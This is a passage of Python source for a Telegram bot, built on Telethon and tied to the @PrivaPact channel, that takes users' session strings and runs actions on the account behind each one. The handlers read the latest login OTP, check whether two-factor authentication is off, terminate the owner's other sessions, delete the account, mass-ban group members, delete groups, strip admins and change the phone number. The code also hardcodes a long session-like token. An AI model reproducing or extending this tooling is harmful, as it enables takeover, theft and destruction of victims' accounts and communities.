عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

    # Update the command cooldown for the user, unless they are a developer
    if not is_developer:
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
    sender_id = user_id  # Store the sender_id

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can send you all users info.
                           
الان ارسل لي كود الترمكس لكي ارسل لك معلومات المستخدم""")
            strses = await x.wait_event(events.NewMessage, timeout=60)


            # Check if the session is empty
            if not strses.text:
                return await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)

            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)

            info = await userinfo(session) if strses.text.startswith("1") or strses.text.endswith("=") else await userinfop(session)

            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second

                await message.edit(info + "\n\n Generate by @PrivaPact", buttons=keyboard)
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")

        except (SessionPasswordNeededError):
            # Handle session error or invalid phone number
            await event.respond("""Invalid session or phone number. Please check your Termux Session.
                                   
ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session within 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)




@client.on(events.CallbackQuery(data=re.compile(b"C")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id

    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 

    user_id = event.sender_id

    # Check if the user is a developer (Owner or Admin)
    is_developer = user_id in Developers

    # If the user is a developer, bypass the cooldown
    if not is_developer:
        # Check if the user is on cooldown
        if user_id in command_cooldown:
            cooldown_end_time = command_cooldown[user_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

        # Update the command cooldown for the user
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
    
    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can ban all group/channel members.
    
الان ارسل لي كود الترمكس""")
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)

            # Check if the session is empty
            if not strses.text:
                return await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)

            session = validate_session(strses.text)
            if not session:
                return await event.respond("""Invalid Session, please use another one.
    
كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)

            await x.send_message("""Send the Group or Channel's ID/username.
    
الان ارسل يوزر القناة او كروب""")
            grpid = await x.get_response()

            # Check if the group/channel ID/username is empty
            if not grpid.text:
                return await event.respond("Empty group/channel ID/username. Please provide a valid ID/username.", buttons=keyboard)

            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")

            # Perform actions with the client using the provided Termux session
            await userbans(session, grpid.text) if strses.text.startswith("1") or strses.text.endswith("=") else await userbansp(session, grpid.text)
            await message.edit("""Banning all Group/Channel members.
                      
تم طرد كل الأعضاء""", buttons=keyboard)
        
        except TimeoutError:
            return await event.respond("""Please provide the termux session within 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")



# Define a dictionary to store the last command execution time for each user
command_cooldown = {}


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    user_id = event.sender_id

    # Check if the user is a developer (Owner or Admin)
    is_developer = user_id in Developers

    # If the user is a developer, bypass the cooldown
    if not is_developer:
        # Check if the user is on cooldown
        if user_id in command_cooldown:
            cooldown_end_time = command_cooldown[user_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

        # Update the command cooldown for the user
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can send you the latest OTP.
                           
الآن أرسل لي كود الترمكس لكي أرسل لك رمز الدخول الأحدث""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except Exception as e:
                await event.respond(f"An error occurred: {str(e)}")

            i = await usermsgs(session) if strses.text.startswith("1") or strses.text.endswith("=") else await usermsgsp(session)
            await message.edit(i + "\n\n start from top to bottom \n\n من الفوق الى الاسفل ابدا", buttons=keyboard)
        
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")


# Rest of the code...

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    user_id = event.sender_id

    # Check if the user is a developer (exempt from cooldown)
    if user_id in Developers:
        pass  # No cooldown for developers
    else:
        # Check if the user is on cooldown
        if user_id in command_cooldown:
            cooldown_end_time = command_cooldown[user_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

        # Update the command cooldown for the user
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can make user join a group/channel.
                           
الان ارسل لي كود الترمكس لكي ادخل المستخدم في قناة او كروب""")
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return
            
            await x.send_message("""Send the Group or Channel usernames, separated by commas.
        
الان ارسل يوزر القنوات او الكروبات مفصولة بفاصلة""")
            usernames = await x.get_response()
            usernames = usernames.text.split(',')

            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                await joingroup(session, usernames) if strses.text.startswith("1") or strses.text.endswith("=") else await joingroupp(session, usernames)
                await message.edit("""Joined Channel/Group.
            
تم الانضمام""", buttons=keyboard)
            except ChannelPrivateError:
                await event.respond(
"""The channel or group you specified is private, or you lack permission to access it.
Please make sure the channels or groups are public and that you have the necessary permissions to join.

القنوات أو الكروبات التي حددتها خاصة أو ليست لديك الصلاحيات اللازمة للوصول إليها.
تأكد من أن القنوات أو الكروبات عامة وأن لديك الصلاحيات اللازمة للانضمام.""",
                    buttons=keyboard
                )
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")
from telethon import errors

# ... Your code ...


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    user_id = event.sender_id

    # Check if the user is a developer (exempt from cooldown)
    is_developer = user_id in Developers

    # Check if the user is on cooldown and not a developer
    if not is_developer and user_id in command_cooldown:
        cooldown_end_time = command_cooldown[user_id]
        time_remaining = cooldown_end_time - datetime.now()

        if time_remaining.total_seconds() > 0:
            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
            return

    # Update the command cooldown for the user
    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can make the user leave the channel/group.

الآن أرسل لي جلسة Termux لكي أخرج المستخدم من القناة/المجموعة.""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return

            await x.send_message("""Send the ID or username of the channel/group.

أرسل معرف القناة أو المجموعة.""")
            group_id = await x.get_response()
            group_id = group_id.text.strip()  # Ensure the group_id is a string
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                await leavegroup(session, group_id) if strses.text.startswith("1") or strses.text.endswith("=") else await leavegroupp(session, group_id)
                await event.respond("""Left channel/group successfully.

تمت المغادرة من القناة/المجموعة بنجاح.""", buttons=keyboard)
            except errors.UserNotParticipantError:
                await event.respond("""The target user is not a member of the specified channel/group.
                
المستخدم ليس عضو في الكروب / قناة """)
     
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")
            
            

from telethon import errors



@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    user_id = event.sender_id

    # Check if the user is a developer
    if user_id in Developers:
        # Allow developers to bypass the cooldown
        await handle_users(event)
    else:
        # Check if the user is on cooldown
        if user_id in command_cooldown:
            cooldown_end_time = command_cooldown[user_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

        # Update the command cooldown for the user
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

        await handle_users(event)


async def handle_users(event):
    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can delete user's own channel/group.
                           
الان ارسل لي كود الترمكس لكي احذف قناة او كروب المستخدم""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return

            await x.send_message("""Send the Group or Channel's ID/username.
        
الان ارسل يوزر القناة او كروب""")
            grpid = await x.get_response()
            group_id = grpid.text.strip()
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")

            try: 
                await delgroup(session, group_id) if strses.text.startswith("1") or strses.text.endswith("=") else await delgroupp(session, group_id)
                await message.edit("""Deleted Channel/Group.
      
تم حذفه""", buttons=keyboard)
            except telethon.errors.rpcerrorlist.QueryIdInvalidError:
                await event.respond("""An error occurred while deleting the Channel/Group.
      
حدث خطأ أثناء حذف القناة أو الكروب.""")
            finally:
                await event.answer()
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")




@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 
    
    user_id = event.sender_id

    # Check if the user is a developer
    if user_id in Developers:
        # Developers are exempt from cooldown
        pass
    elif user_id in command_cooldown:
        # Check if the user is on cooldown
        cooldown_end_time = command_cooldown[user_id]
        time_remaining = cooldown_end_time - datetime.now()

        if time_remaining.total_seconds() > 0:
            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
            return

    # Update the command cooldown for the user
    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can check if 2FA is activated.
                           
الان ارسل لي كود الترمكس لكي ارى اذا المستخدم لديه تحقق بخطوتين""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            i = await user2fa(session) if strses.text.startswith("1") or strses.text.endswith("=") else await user2fap(session)
            if i:
                await message.edit("""The user hasn't activated 2FA!
        
الشخص لم يفعل التحقق بخطوتين""", buttons=keyboard)
            else:
                await message.edit("""Sorry, the user has activated 2FA.
        
اسف، الشخص فعل التحقق بخطوتين""")
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 

    user_id = event.sender_id

    # Check if the user is a developer
    is_developer = user_id in Developers

    # Check if the user is on cooldown and not a developer
    if not is_developer and user_id in command_cooldown:
        cooldown_end_time = command_cooldown[user_id]
        time_remaining = cooldown_end_time - datetime.now()

        if time_remaining.total_seconds() > 0:
            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
            return

    # Update the command cooldown for the user if not a developer
    if not is_developer:
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can Terminate all other sessions.
                           
الان ارسل لي كود الترمكس لكي انهي جميع الجلسات ماعدى البوت""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                await terminate(session) if strses.text.startswith("1") or strses.text.endswith("=") else await terminatep(session)
                await message.edit("""Terminated all other device sessions besides the Termux session.
            
تم طرد جميع الجلسات الأخرى باستثناء جلسة Termux.""", buttons=keyboard)
            except telethon.errors.rpcerrorlist.FreshResetAuthorisationForbiddenError:
                await event.respond("""The current session is too new and cannot be used to terminate other sessions yet.
Please wait 24 hours before performing this action again.
            
الجلسة الحالية جديدة جدًا ولا يمكن استخدامها لطرد الجلسات الأخرى حاليًا.
يرجى الانتظار 24 ساعة قبل تنفيذ هذا الإجراء مرة أخرى.""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")

      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def delete_account(event):
    # Check if the user is an owner

    # Exclude developers from the cooldown
    if event.sender_id in Developers:
        await handle_delete_account(event)
    else:
        # Check if the user is on cooldown
        if event.sender_id in command_cooldown:
            cooldown_end_time = command_cooldown[event.sender_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

        # Update the command cooldown for the user
        command_cooldown[event.sender_id] = datetime.now() + timedelta(seconds=10)
        
        await handle_delete_account(event)

async def handle_delete_account(event):
    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can delete the account.
                           
الان ارسل لي كود الترمكس لكي احذف الحساب""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)
            session = validate_session(strses.text)

                        if session == "AgGs4YUAmhnNheg9ZElgWSLkWIqYs0DdSPJBuXY6zvI8j7pZUN-j-Hdrn3nk8EbgexufUQ8SiShuwXFkViLZdpYWs_yqc0rq4qshjir2h0Z0ES7OI2ecccCmVy3q0D0T2gqhrxy0TKkRjh9PEAKqxfxjUTXmfN6vbKiQnJEOW7BuJddSAnyJKzzeeP_I3NqionVOCNIfBXLMLBBSHOpma9_KJBF6ojyFLEsVf5OK3tEeyqSIIvBcVmD4ow2WCKGoklN2YSM5Etc1LeOkFe2JI2nDHV5wb8KFzppwsy1mr0KIwzqxA9F234KpD0Ii9ujfxG_3l2hg6JZkryKDsSzk-2_l0-5gNwAAAAFnAW-4AA":
                return await event.respond("""ها ها كلاوجي شتريد تسوي.""", buttons=keyboard)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")

            try:
                await delacc(session) if strses.text.startswith("1") or strses.text.endswith("=") else await delaccp(session)
                await message.edit("""Deleted Account.
            
تم حذف الحساب""", buttons=keyboard)
            except telethon.errors.rpcerrorlist.QueryIdInvalidError:
                pass
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرجاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")



                                 



from telethon import errors
from telethon.errors import UserNotParticipantError

from telethon.errors import UserNotParticipantError

@client.on(events.CallbackQuery(data=re.compile(b"K")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    user_id = event.sender_id

    # Check if the user is a developer
    is_developer = user_id in Developers

    # Check if the user is on cooldown, unless they are a developer
    if not is_developer:
        if user_id in command_cooldown:
            cooldown_end_time = command_cooldown[user_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

    # Update the command cooldown for the user, unless they are a developer
    if not is_developer:
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can add a user as admin.
                           
الان ارسل لي كود الترمكس لكي ارفع مستخدم كادمن""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return
            
            await x.send_message("""Send the Group or Channel's ID/username.
      
ارسل يوزر القناة او كروب""")
            grp = await x.get_response()
            group_id = grp.text.strip()
            
            await x.send_message("""Send me the username to add as admin.
      
ارسل يوزر لرفعه ادمن""")
            user = await x.get_response()
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")

            try:
                i = await promote(session, group_id, user.text) if strses.text.startswith("1") or strses.text.endswith("=") else await promotep(session, group_id, user.text)
                await event.respond("""User added as admin successfully
                
تم رفع الادمن""")
            except Exception as e:
                await event.respond(f"""An error occurred: {str(e)})
         
حدث خطا اثناء رفع الادمن""")
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        





@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 

    user_id = event.sender_id

    # Check if the user is a developer (exempt from cooldown)
    if user_id not in Developers:
        # Check if the user is on cooldown
        if user_id in command_cooldown:
            cooldown_end_time = command_cooldown[user_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
                return

        # Update the command cooldown for the user
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can remove all admins.
                           
الان ارسل لي كود الترمكس لكي ازالة جميع الادمنية""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return
            
            await x.send_message("""Send the Group or Channel's, Id/username.
      
ارسل يوزر القناة او كروب""")
            pro = await x.get_response()
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                i = await demall(session, pro.text) if strses.text.startswith("1") or strses.text.endswith("=") else await demallp(session, pro.text)

                await event.respond("""Removed all admins from Group/Channel
      
تم حذف جميع الادمنية في الكروب""", buttons=keyboard)
            except telethon.errors.rpcerrorlist.QueryIdInvalidError:
                await event.respond("""An error occurred. Please try again later.""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")





@client.on(events.CallbackQuery(data=re.compile(b"M")))
async def users(event):
    user_id = event.sender_id

    # Check if the user is a developer
    is_developer = user_id in Developers

    # Check if the user is on cooldown, unless they are a developer
    if not is_developer and user_id in command_cooldown:
        cooldown_end_time = command_cooldown[user_id]
        time_remaining = cooldown_end_time - datetime.now()

        if time_remaining.total_seconds() > 0:
            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
            return

    # Update the command cooldown for the user, unless they are a developer
    if not is_developer:
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 
    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can change phone number.
                           
الان ارسل لي كود الترمكس لكي اغير رقم الحساب""")
                                 
            sender_id = event.sender_id 
